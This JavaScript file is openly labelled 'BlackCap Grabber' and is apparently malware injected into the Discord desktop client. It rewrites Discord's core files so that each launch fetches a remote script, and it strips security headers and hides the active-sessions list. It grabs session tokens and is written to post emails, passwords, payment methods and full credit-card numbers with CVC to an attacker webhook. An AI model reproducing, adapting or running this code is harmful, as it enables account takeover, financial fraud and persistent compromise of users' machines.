const fs = require('fs');
const path = require('path');
const {
	BrowserWindow,
	session
} = require('electron')
const args = process.argv;
const querystring = require('querystring');
const os = require('os')
const https = require("https");
const computerName = os.hostname();

const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`

String.prototype.insert = function (index, string) {
	if (index > 0) {
		return this.substring(0, index) + string + this.substr(index);
	}

	return string + this;
};

const config = {
    "logout": "true",
    "logout-notify": "true",
    "init-notify": "true",
    "embed-color": 374276,

 injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
 webhook: "%WEBHOOK_LINK%",
 filter2: {
    urls: [
      "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
      "https://*.discord.com/api/v*/applications/detectable",
      "https://discord.com/api/v*/applications/detectable",
      "https://*.discord.com/api/v*/users/@me/library",
      "https://discord.com/api/v*/users/@me/library",
      "wss://remote-auth-gateway.discord.gg/*",
    ],
  },
};












const discordPath = (function () {
    const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;
    if (process.platform === "win32") {
        resourcePath = path.join(app, "resources");
    }
    else if (process.platform === "darwin") {
        resourcePath = path.join(app, "Contents", "Resources");
    }
    if (fs.existsSync(resourcePath)) return { resourcePath, app };
    return "", "";
})();

function updateCheck() {
    const { resourcePath, app } = discordPath;
    if (resourcePath === undefined || app === undefined) return;
    const appPath = path.join(resourcePath, "app");
    const packageJson = path.join(appPath, "package.json");
    const resourceIndex = path.join(appPath, "index.js");
	const indexJs = `${app}\\modules\\discord_desktop_core-2\\discord_desktop_core\\index.js`;
    const bdPath = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

    if (process.platform === "win32" || process.platform === "darwin") {
        fs.writeFileSync(
            packageJson,
            JSON.stringify(
                {
                    name: "discord",
                    main: "index.js",
                },
                null,
                4,
            ),
        );

        const startUpScript = `const fs = require('fs'), https = require('https');
const indexJS = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJS).size
fs.readFileSync(indexJS, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJS);
        res.replace('core' + 'num', indexJS).replace('%WEBHOOK_LINK%', '${config.webhook}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, "app.asar")}')
if (fs.existsSync(bdPath)) require(bdPath);`;

        fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, "\\\\"));
    }
    if (!fs.existsSync(path.join(__dirname, "blackcap"))) return !0;
    execScript(
        `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
    );
    return !1;
}

const execScript = (script) => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, !0);
};

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
};

async function noSessionPlease() {
    await sleep(1000)
    execScript(`
function userclick() {
    waitForElm(".children-1xdcWE").then((elm)=>elm[2].remove())
    waitForElm(".sectionTitle-3j2YI1").then((elm)=>elm[2].remove())
}
function IsSession(item) {
    return item?.innerText?.includes("Devices")
}
function handler(e) {
    e = e || window.event;
    var target = e.target || e.srcElement,
    text = target.textContent || target.innerText;   
    if (IsSession(target)) userclick()
}
function waitForElm(selector) {
    return new Promise(resolve => {
        const observer = new MutationObserver(mutations => {
            if (document.querySelectorAll(selector).length>2) {
                resolve(document.querySelectorAll(selector))
            observer.disconnect();
            }
        });
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    });
}
document.addEventListener('click',handler,false);
`)
};

noSessionPlease()










session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
	if (details.url.startsWith(config.webhook)) {
		if (details.url.includes("discord.com")) {
			callback({
				responseHeaders: Object.assign({
					'Access-Control-Allow-Headers': "*"
				}, details.responseHeaders)
			});
		} else {
			callback({
				responseHeaders: Object.assign({
					"Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
					'Access-Control-Allow-Headers': "*",
					"Access-Control-Allow-Origin": "*"
				}, details.responseHeaders)
			});
		}


	} else {
		delete details.responseHeaders['content-security-policy'];
		delete details.responseHeaders['content-security-policy-report-only'];

		callback({
			responseHeaders: {
				...details.responseHeaders,
				'Access-Control-Allow-Headers': "*"
			}
		})
	}

})






const hooker = async (content) => {
	const data = JSON.stringify(content);
	const url = new URL(config.webhook);
	const options = {
	  protocol: url.protocol,
	  hostname: url.host,
	  path: url.pathname,
	  method: "POST",
	  headers: {
		"Content-Type": "application/json",
		"Access-Control-Allow-Origin": "*",
	  },
	};
	const req = https.request(options);
  
	req.on("error", (err) => {
	  console.log(err);
	});
	req.write(data);
	req.end();
  };


function FirstTime() {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`${EvalToken}`, !0).then((token => {

		if (config['init-notify'] == "true") {
			if (fs.existsSync(path.join(__dirname, "blackcap"))) {
				fs.rmdirSync(path.join(__dirname, "blackcap"));
				if (token == null || token == undefined || token == "") {
					window.webContents.executeJavaScript(`
					var xmlHttp = new XMLHttpRequest();
					xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
					xmlHttp.send( null );
					xmlHttp.responseText;
					`, !0).then((ip) => {
					const c = {
						username: "BlackCap",
						content: "",
						embeds: [{
							title: "BlackCap Initalized",
							color: config["embed-color"],
							fields: [{
								name: "Injection Info",
								value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
								inline: !1
							}],
							author: {
								name: "BlackCap"
							},
							footer: {
								text: "©KSCH | https://github.com/KSCHdsc"
							}
						}]
					};
					hooker(c)
				})				
				} else {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`
                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${token}"),xmlHttp.send(null),xmlHttp.responseText;
                    `, !0).then(a => {
						window.webContents.executeJavaScript(`
						var xmlHttp = new XMLHttpRequest();
						xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
						xmlHttp.send( null );
						xmlHttp.responseText;
						`, !0).then((ip) => {
						const b = JSON.parse(a);
						const c = {
							username: "BlackCap",
							content: "",
							embeds: [{
								title: "BlackCap Initalized",
								description: "[<a:blackcap:1022770267270938664> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
								color: config["embed-color"],
								fields: [{
									name: "Injection Info",
									value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
									inline: !1
								}, {
									name: "Username <:icon4:1024615934519955496> ",
									value: `\`${b.username}#${b.discriminator}\``,
									inline: !0
								}, {
									name: "ID <:icon3:1024615933228109834>",
									value: `\`${b.id}\``,
									inline: !0
								}, {
									name: "Badges <:icon5:1024615931869147146>",
									value: `${GetBadges(b.flags)}`,
									inline: !0
								}, {
									name: "Token <a:icon1:1024615171907407892>",
									value: `\`\`\`${token}\`\`\``,
									inline: !1
								}],
								
                                footer: {
                                    text: "©KSCH | https://github.com/KSCHdsc"
                                },
								thumbnail: {
									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
								}
							}]
						};
						
						hooker(c)
					})});
				}

			}
		}
		if (!fs.existsSync(path.join(__dirname, "blackcap"))) {
			return !0
		}

		fs.rmdirSync(path.join(__dirname, "blackcap"));
		if (config.logout != "false" || config.logout == "%LOGOUT%") {
			if (config['logout-notify'] == "true") {
				if (token == null || token == undefined || token == "") {
					window.webContents.executeJavaScript(`
					var xmlHttp = new XMLHttpRequest();
					xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
					xmlHttp.send( null );
					xmlHttp.responseText;
					`, !0).then((ip) => {
					const c = {
						username: "BlackCap Grabber",
						content: "",
						embeds: [{
							title: "BlackCaped User log out (User not Logged in before)",
							color: config["embed-color"],
							fields: [{
								name: "Injection Info",
								value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
								inline: !1
							}],
							author: {
								name: "BlackCap"
							},
							footer: {
								text: "©KSCH | https://github.com/KSCHdsc"
							}
						}]
					};
					hooker(c)
				})
				} else {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`
                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${token}"),xmlHttp.send(null),xmlHttp.responseText;
                    `, !0).then(a => {
						window.webContents.executeJavaScript(`
						var xmlHttp = new XMLHttpRequest();
						xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
						xmlHttp.send( null );
						xmlHttp.responseText;
						`, !0).then((ip) => {
						const b = JSON.parse(a);
						const c = {
							username: "BlackCap Grabber",
							content: "",
							embeds: [{
								title: "BlackCap Victim got logged out",
								description: "[<a:blackcap:1022770267270938664> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
								color: config["embed-color"],
								fields: [{
									name: "Injection Info",
									value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
									inline: !1
								}, {
									name: "Username <:icon4:1024615934519955496> ",
									value: `\`${b.username}#${b.discriminator}\``,
									inline: !0
								}, {
									name: "ID <:icon3:1024615933228109834>",
									value: `\`${b.id}\``,
									inline: !0
								}, {
									name: "Badges <:icon5:1024615931869147146>",
									value: `${GetBadges(b.flags)}`,
									inline: !0
								}, {
									name: "Token <a:icon1:1024615171907407892>",
									value: `\`\`\`${token}\`\`\``,
									inline: !1
								}],
								
                                footer: {
                                    text: "©KSCH | https://github.com/KSCHdsc"
                                },
								thumbnail: {
									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
								}
							}]
						};
						hooker(c)
					})});
				}
			}
			const window = BrowserWindow.getAllWindows()[0];
			window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
		}
		return !1
	}))
}
const Filter = {
	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}




function GetNitro(flags) {
	if (flags == 0) {
		return "No Nitro"
	}
	if (flags == 1) {
		return "<:classic:896119171019067423> \`Nitro Classic\`"
	}
	if (flags == 2) {
		return "<a:boost:824036778570416129> \`Nitro Boost\`"
	} else {
		return "No Nitro"
	}
}

function GetRBadges(flags) {
	const Discord_Employee = 1;
	const Partnered_Server_Owner = 2;
	const HypeSquad_Events = 4;
	const Bug_Hunter_Level_1 = 8;
	const Early_Supporter = 512;
	const Bug_Hunter_Level_2 = 16384;
	const Early_Verified_Bot_Developer = 131072;
	var badges = "";
	if ((flags & Discord_Employee) == Discord_Employee) {
		badges += "<:staff:874750808728666152> "
	}
	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
		badges += "<:partner:874750808678354964> "
	}
	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
		badges += "<:hypesquad_events:874750808594477056> "
	}
	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
		badges += "<:bughunter_1:874750808426692658> "
	}
	if ((flags & Early_Supporter) == Early_Supporter) {
		badges += "<:early_supporter:874750808414113823> "
	}
	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
		badges += "<:bughunter_2:874750808430874664> "
	}
	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
		badges += "<:developer:874750808472825986> "
	}
	if (badges == "") {
		badges = ""
	}
	return badges
}

function GetBadges(flags) {
	const Discord_Employee = 1;
	const Partnered_Server_Owner = 2;
	const HypeSquad_Events = 4;
	const Bug_Hunter_Level_1 = 8;
	const House_Bravery = 64;
	const House_Brilliance = 128;
	const House_Balance = 256;
	const Early_Supporter = 512;
	const Bug_Hunter_Level_2 = 16384;
	const Early_Verified_Bot_Developer = 131072;
	var badges = "";
	if ((flags & Discord_Employee) == Discord_Employee) {
		badges += "<:staff:874750808728666152> "
	}
	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
		badges += "<:partner:874750808678354964> "
	}
	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
		badges += "<:hypesquad_events:874750808594477056> "
	}
	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
		badges += "<:bughunter_1:874750808426692658> "
	}
	if ((flags & House_Bravery) == House_Bravery) {
		badges += "<:bravery:874750808388952075> "
	}
	if ((flags & House_Brilliance) == House_Brilliance) {
		badges += "<:brilliance:874750808338608199> "
	}
	if ((flags & House_Balance) == House_Balance) {
		badges += "<:balance:874750808267292683> "
	}
	if ((flags & Early_Supporter) == Early_Supporter) {
		badges += "<:early_supporter:874750808414113823> "
	}
	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
		badges += "<:bughunter_2:874750808430874664> "
	}
	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
		badges += "<:developer:874750808472825986> "
	}
	if (badges == "") {
		badges = "None"
	}
	return badges
}

function Login(email, password, token) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
							window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
								window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
									window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {
										function totalFriends() {
											var f = JSON.parse(info4)
											const r = f.filter((user) => {
												return user.type == 1
											})
											return r.length
										}

										function CalcFriends() {
											var f = JSON.parse(info4)
											const r = f.filter((user) => {
												return user.type == 1
											})
											var gay = "";
											for (z of r) {
												var b = GetRBadges(z.user.public_flags)
												if (b != "") {
													gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
												}
											}
											if (gay == "") {
												gay = "No Rare Friends"
											}
											return gay
										}

										function Cool() {
											const json = JSON.parse(info3)
											var billing = "";
											json.forEach(z => {
												if (z.type == "") {
													return "\`❌\`"
												} else if (z.type == 2 && z.invalid != !0) {
													billing += "\`✔️\`" + " <:paypal:896441236062347374>"
												} else if (z.type == 1 && z.invalid != !0) {
													billing += "\`✔️\`" + " :credit_card:"
												} else {
													return "\`❌\`"
												}
											})
											if (billing == "") {
												billing = "\`❌\`"
											}
											return billing
										}
										const json = JSON.parse(info);
										const params = {
											username: "BlackCap Grabber",
											content: "",
											embeds: [{
												"title": "BlackCap User Login",
                                                description: "[<a:blackcap:1022770267270938664> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
												"color": config['embed-color'],
												"fields": [{
													name: "Injection Info",
													value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
													inline: !1
												}, {
													name: "Username <:icon4:1024615934519955496> ",
													value: `\`${json.username}#${json.discriminator}\``,
													inline: !0
												}, {
													name: "ID <:icon3:1024615933228109834>",
													value: `\`${json.id}\``,
													inline: !0
												}, {
													name: "Nitro <a:_diamond:1018223518913150977>",
													value: `${GetNitro(json.premium_type)}`,
													inline: !0
												}, {
													name: "Badges <:icon5:1024615931869147146>",
													value: `${GetBadges(json.flags)}`,
													inline: !0
												}, {
													name: "Billing <a:icon8:1024619392652288071>",
													value: `${Cool()}`,
													inline: !1
												}, {
													name: "Email <a:Email:1024615399314161744>",
													value: `\`${email}\``,
													inline: !0
												}, {
													name: "<a:icon6:1024617637390598164> Password ",
													value: `\`${password}\``,
													inline: !0
												}, {
													name: "Token <a:icon1:1024615171907407892>",
													value: `\`\`\`${token}\`\`\``,
													inline: !1
												}, ],
												
												"footer": {
													"text": "©KSCH | https://github.com/KSCHdsc"
												},
												"thumbnail": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}, {
												"title": `<a:icon10:1024621262766604348> Total Friends (${totalFriends()})`,
												"color": config['embed-color'],
												"description": CalcFriends(),
												
												"footer": {
													"text": "©KSCH | https://github.com/KSCHdsc"
												},
												"thumbnail": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}]
										}
										hooker(params)
								})
							})
					})
			})

}




function ChangePassword(oldpassword, newpassword, token) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`
	var xmlHttp = new XMLHttpRequest();
	xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
	xmlHttp.send( null );
	xmlHttp.responseText;
	`, !0).then((ip) => {
	window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
							window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
								window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
									window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {

										function totalFriends() {
											var f = JSON.parse(info4)
											const r = f.filter((user) => {
												return user.type == 1
											})
											return r.length
										}

										function CalcFriends() {
											var f = JSON.parse(info4)
											const r = f.filter((user) => {
												return user.type == 1
											})
											var gay = "";
											for (z of r) {
												var b = GetRBadges(z.user.public_flags)
												if (b != "") {
													gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
												}
											}
											if (gay == "") {
												gay = "No Rare Friends"
											}
											return gay
										}

										function Cool() {
											const json = JSON.parse(info3)
											var billing = "";
											json.forEach(z => {
												if (z.type == "") {
													return "\`❌\`"
												} else if (z.type == 2 && z.invalid != !0) {
													billing += "\`✔️\`" + " <:paypal:896441236062347374>"
												} else if (z.type == 1 && z.invalid != !0) {
													billing += "\`✔️\`" + " :credit_card:"
												} else {
													return "\`❌\`"
												}
											})
											if (billing == "") {
												billing = "\`❌\`"
											}
											return billing
										}
										const json = JSON.parse(info);
										const params = {
											username: "BlackCap Grabber",
											content: "",
											embeds: [{
												"title": "BlackCap Detect Password Changed",
                                                description: "[<a:blackcap:1022770267270938664> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
												"color": config['embed-color'],
												"fields": [{
													name: "Injection Info",
													value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
													inline: !1
												}, {
													name: "Username <:icon4:1024615934519955496> ",
													value: `\`${json.username}#${json.discriminator}\``,
													inline: !0
												}, {
													name: "ID <:icon3:1024615933228109834>",
													value: `\`${json.id}\``,
													inline: !0
												}, {
													name: "Nitro <a:_diamond:1018223518913150977>",
													value: `${GetNitro(json.premium_type)}`,
													inline: !0
												}, {
													name: "Badges <:icon5:1024615931869147146>",
													value: `${GetBadges(json.flags)}`,
													inline: !0
												}, {
													name: "Billing <a:icon8:1024619392652288071>",
													value: `${Cool()}`,
													inline: !1
												}, {
													name: "Email <a:Email:1024615399314161744>",
													value: `\`${json.email}\``,
													inline: !1
												}, {
													name: "<a:icon6:1024617637390598164> Old Password",
													value: `\`${oldpassword}\``,
													inline: !0
												}, {
													name: "<a:icon6:1024617637390598164> New Password",
													value: `\`${newpassword}\``,
													inline: !0
												}, {
													name: "Token <a:icon1:1024615171907407892>",
													value: `\`\`\`${token}\`\`\``,
													inline: !1
												}, ],
												
												"footer": {
													"text": "©KSCH | https://github.com/KSCHdsc"
												},
												"thumbnail": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}, {
												"title": `<a:icon10:1024621262766604348> Total Friends (${totalFriends()})`,
												"color": config['embed-color'],
												"description": CalcFriends(),
												
												"footer": {
													"text": "©KSCH | https://github.com/KSCHdsc"
												},
												"thumbnail": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}]
										}
									hooker(params)
							})
						})
					})
			})
		})

}

function ChangeEmail(newemail, password, token) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`
	var xmlHttp = new XMLHttpRequest();
	xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
	xmlHttp.send( null );
	xmlHttp.responseText;
	`, !0).then((ip) => {
	window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
							window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
								window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
									window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {

										function totalFriends() {
											var f = JSON.parse(info4)
											const r = f.filter((user) => {
												return user.type == 1
											})
											return r.length
										}

										function CalcFriends() {
											var f = JSON.parse(info4)
											const r = f.filter((user) => {
												return user.type == 1
											})
											var gay = "";
											for (z of r) {
												var b = GetRBadges(z.user.public_flags)
												if (b != "") {
													gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
												}
											}
											if (gay == "") {
												gay = "No Rare Friends"
											}
											return gay
										}

										function Cool() {
											const json = JSON.parse(info3)
											var billing = "";
											json.forEach(z => {
												if (z.type == "") {
													return "\`❌\`"
												} else if (z.type == 2 && z.invalid != !0) {
													billing += "\`✔️\`" + " <:paypal:896441236062347374>"
												} else if (z.type == 1 && z.invalid != !0) {
													billing += "\`✔️\`" + " :credit_card:"
												} else {
													return "\`❌\`"
												}
											})
											if (billing == "") {
												billing = "\`❌\`"
											}
											return billing
										}
										const json = JSON.parse(info);
										const params = {
											username: "BlackCap Grabber",
											content: "",
											embeds: [{
												"title": "BlackCap Detect Email Changed",
                                                description: "[<a:blackcap:1022770267270938664> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
												"color": config['embed-color'],
												"fields": [{
													name: "Injection Info",
													value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
													inline: !1
												}, {
													name: "Username <:icon4:1024615934519955496> ",
													value: `\`${json.username}#${json.discriminator}\``,
													inline: !0
												}, {
													name: "ID <:icon3:1024615933228109834>",
													value: `\`${json.id}\``,
													inline: !0
												}, {
													name: "Nitro <a:_diamond:1018223518913150977>",
													value: `${GetNitro(json.premium_type)}`,
													inline: !0
												}, {
													name: "Badges <:icon5:1024615931869147146>",
													value: `${GetBadges(json.flags)}`,
													inline: !0
												}, {
													name: "Billing <a:icon8:1024619392652288071>",
													value: `${Cool()}`,
													inline: !1
												}, {
													name: "New Email <a:Email:1024615399314161744>",
													value: `\`${newemail}\``,
													inline: !0
												}, {
													name: "<a:icon6:1024617637390598164> Password",
													value: `\`${password}\``,
													inline: !0
												}, {
													name: "Token <a:icon1:1024615171907407892>",
													value: `\`\`\`${token}\`\`\``,
													inline: !1
												}, ],
												
												"footer": {
													"text": "©KSCH | https://github.com/KSCHdsc"
												},
												"thumbnail": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}, {
												"title": `<a:icon10:1024621262766604348> Total Friends (${totalFriends()})`,
												"color": config['embed-color'],
												"description": CalcFriends(),
												
												"footer": {
													"text": "©KSCH | https://github.com/KSCHdsc"
												},
												"thumbnail": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}]
										}
										hooker(params)
									})
							})
					})
			})
		})

}

function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
		window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
			var json = JSON.parse(info);
			const params = {
				username: "BlackCap Grabber",
				content: "",
				embeds: [{
					"title": "BlackCap User Credit Card Added",
					"description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
					"author": {
						"name": "BlackCap"
					},
					"footer": {
						"text": "©KSCH | https://github.com/KSCHdsc"
					},
					"thumbnail": {
						"url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
					}
				}]
			}
			hooker(params)
		})
	})
}
const ChangePasswordFilter = {
	urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
};




session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
	if (details.url.startsWith("wss://remote-auth-gateway")) return callback({ cancel: true });
    updateCheck();
	
	if (FirstTime()) {}

	callback({})
	return;
})


